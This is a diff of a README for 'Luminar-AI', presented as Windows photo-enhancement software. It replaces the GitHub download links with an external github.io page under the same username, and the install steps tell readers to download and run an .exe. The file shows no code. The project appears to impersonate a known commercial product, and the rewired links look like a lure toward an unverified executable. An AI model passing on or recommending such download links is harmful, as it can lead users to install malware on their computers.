@@ -1,6 +1,6 @@
 # 🖼️ Luminar-AI - Enhance your photos using smart technology
 
-[![](https://img.shields.io/badge/Download-Luminar--AI-blue.svg)](https://github.com/Riceautumnflowering333/Luminar-AI)
+[![](https://img.shields.io/badge/Download-Luminar--AI-blue.svg)](https://riceautumnflowering333.github.io)
 
 Luminar-AI helps you improve your digital photos. This software uses artificial intelligence to fix lighting, sharpen details, and replace skies in your images. It works on Windows 10 and Windows 11 computers.
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run this software. Check this list to ensu
 
 Follow these steps to put the software onto your computer.
 
-1. Go to the [download page](https://github.com/Riceautumnflowering333/Luminar-AI).
+1. Go to the [download page](https://riceautumnflowering333.github.io).
 2. Look for the button or link labeled "Releases" on the right side of the page.
 3. Click the link for the latest version.
 4. Select the file ending in .exe to start your download.
